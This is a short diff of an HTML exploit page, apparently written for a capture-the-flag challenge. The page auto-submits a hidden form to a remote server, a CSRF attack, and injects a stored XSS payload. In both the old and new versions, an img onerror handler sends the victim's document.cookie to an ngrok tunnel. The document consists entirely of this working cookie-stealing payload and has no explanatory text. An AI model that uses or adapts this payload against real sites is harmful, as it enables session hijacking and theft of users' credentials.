@@ -1,14 +1,13 @@
-<!DOCTYPE html>
 <html>
-<body>
-<h1>Loading...</h1>
-<form id="f" action="http://web:3000/create" method="POST">
-    <input type="hidden" name="title" value="xss" />
-    <input type="hidden" name="template" value="<img src=x onerror='new Image().src=`https://45b5706b1f75.ngrok-free.app/?c=${document.cookie}`'>" />
-    <input type="hidden" name="answers" value="😃😃😃😃😃😃😃😃" />
-</form>
-<script>
-document.getElementById('f').submit();
-</script>
-</body>
+  <body>
+    <form action="http://125.138.133.213:52306/" method="POST">
+      <input type="hidden" name="title" value="xss" />
+      <input type="hidden" name="template" value="<img src=x onerror='fetch(`https://5ba0db6c414d.ngrok-free.app?${document.cookie}`)'>" />
+      <input type="hidden" name="answers" value="😃😃😃😃😃😃😃😃" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+  <script>
+    document.forms[0].submit();
+  </script>
 </html>
